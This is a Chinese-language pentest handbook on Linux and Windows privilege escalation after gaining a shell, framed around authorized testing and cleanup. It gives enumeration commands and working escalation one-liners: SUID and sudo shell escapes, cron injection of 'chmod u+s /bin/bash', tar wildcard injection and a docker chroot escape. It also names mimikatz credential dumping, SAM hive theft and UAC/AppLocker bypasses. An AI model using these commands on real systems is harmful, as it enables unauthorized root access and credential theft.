# Linux/Windows 提权手册（拿 shell 后的纵深）

> 拿到 RCE/低权 shell 后的提权评估（授权范围）。核心思路：**先信息收集定位提权面，再对症利用**。命令均在授权目标上执行，PoC 后清理。

## 一、Linux 提权

### 1. 信息收集（第一步，决定路径）

```bash
uname -a                          # 内核版本+架构
cat /proc/version                 # 内核编译信息（GCC 版本）
cat /etc/os-release               # 发行版
id                               # 当前用户+组
sudo -l                          # sudo 配置（sudoers 可执行列表）
find / -perm -4000 -type f 2>/dev/null   # SUID 文件
getcap -r / 2>/dev/null          # Capabilities
crontab -l; ls -la /etc/cron*     # 定时任务
ps aux                            # 进程（找 root 起的服务/app）
cat /etc/passwd | grep sh$        # 有 shell 的用户
find / -writable -type f 2>/dev/null | grep -v proc  # 可写文件（-w 对 root 无意义）
history; cat ~/.bash_history      # 历史（密码/路径线索）
ip a; ss -tlnp                    # 网络（内网横向线索）
```

一键自动化：`linpeas.sh` / `linenum.sh` / `pspy`（进程监控）。

### 2. 经典提权链

| 面 | 手法 | 关键命令 |
|----|------|---------|
| SUID 滥用 | 有 SUID 的二进制查 GTFOBins | `find / -perm -4000`; `find -exec whoami \;`、`python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |
| sudo 配置 | sudoers 允许的二进制同样查 GTFOBins | `sudo -l` → `sudo vim -c ':!/bin/sh'` 等 |
| 内核漏洞 | 版本对 CVE（Dirty Pipe 2022-0847、CVE-2023-0386、CVE-2024-1086） | 先手工查版本，再**影子环境验证**利用 |
| Capabilities | `cap_setuid+ep` 二进制 | `getcap -r /` → 利用 |
| Cron/定时任务 | root 的 cron 脚本可写 | `ls -la /etc/cron*`; 脚本注入 `chmod u+s /bin/bash` |
| 可写 PATH | 脚本调用无绝对路径命令 | 在 PATH 前段放同名恶意命令 |
| 通配符注入 | cron 脚本用 `tar *`/`chown *` | `--checkpoint=1 --checkpoint-action=exec=...` |
| 共享库劫持 | 程序加载可写路径的 .so / LD_PRELOAD | `LD_PRELOAD=/tmp/x.so`（需 sudo 环境） |
| Docker 组 | 用户属于 docker 组 | `docker run -v /:/mnt -it alpine chroot /mnt` |
| NFS | no_root_squash 挂载点 | 客户端 root 写 setuid 文件 |
| 服务提权 | root 起的 web/app 可写目录/配置 | 替换配置/重启触发 |

### 3. 内核漏洞利用纪律
- **先查版本再找洞**：`uname -r` + 发行版 → 已知 CVE 匹配
- **影子环境验证**：本地 VM/容器跑通利用 → 目标只用无害命令验证（`id` 变 root）
- 内核 exploit 稳定性差（可能崩溃系统），**生产目标不硬上**，报告说明即可

## 二、Windows 提权

### 1. 信息收集

```cmd
whoami /all                        # 用户+组+特权（SeImpersonate 等）
systeminfo                         # 补丁级别
net user %username%                # 组成员
wmic qfe list brief                # 已装补丁
tasklist /svc                      # 进程+服务
```

一键：`winPEAS.exe` / `Seatbelt` / `PowerUp.ps1`。

### 2. 高价值特权 → 对应打法

| 特权 | 打法 |
|------|------|
| SeImpersonate / SeAssignPrimaryToken | **Potato 族**：PrintSpoofer（2020 后主流）、GodPotato（2022-2026）、JuicyPotato（Server 2016 前）、RoguePotato |
| SeDebugPrivilege | 令牌窃取：附加到 SYSTEM 进程，`mimikatz sekurlsa::` 或进程注入 |
| SeBackup / SeRestore | 备份权限读写任意文件：复制 SAM/SYSTEM hive |
| SeLoadDriver | 加载恶意驱动（需签名绕过，难度高） |

### 3. 经典配置漏洞

| 面 | 手法 |
|----|------|
| 未引用服务路径 | `wmic service get name,pathname` 找 binPath 含空格未加引号 → 前段路径放同名 exe |
| 服务二进制可写 | `accesschk.exe -uwdqs` 找可写服务 → 替换 exe（SYSTEM 启动） |
| 计划任务 | `schtasks /query /fo LIST /v` 找可写任务的运行程序 |
| DLL 劫持 | 应用从可写目录加载 DLL（Process Monitor 看 Missing DLL） |
| UAC 绕过 | fodhelper/sdclt/CMSTP 类（提权到 split token，非 SYSTEM） |
| AppLocker 绕过 | LOLBIN：MSBuild 编译执行、regsvr32 等 |
| 凭据提取 | SAM/LSASS（需 SYSTEM 或 SeDebug）、DPAPI、浏览器密码、`mimikatz` |
| 域提权 | Kerberoasting/AS-REP（拿 hash 爆破）、ACL 滥用、ADCS ESC1-8（见内网手册） |

### 4. 工具纪律
- winPEAS/Seatbelt 输出人工复核，不把工具输出当结论
- mimikatz 在**演练/授权环境**使用；SRC 不做凭据转储
- DLL/服务替换必须可回滚（备份原文件）

## 三、通用纪律
1. 信息收集先行：Linux `linpeas` / Windows `winPEAS` 是起点不是终点
2. 影子环境先验证利用链，目标上只做无害证明（`id`/`whoami` 到 root/system）
3. 提权成功后**不留后门不做持久化**（持久化见 APT 报告视角，不实际部署）
4. 内核 exploit 稳定风险大，生产环境止步于「已确认存在 CVE 版本 + 报告建议」
5. 所有改动（文件/服务/计划任务）用后清理，保持系统原状
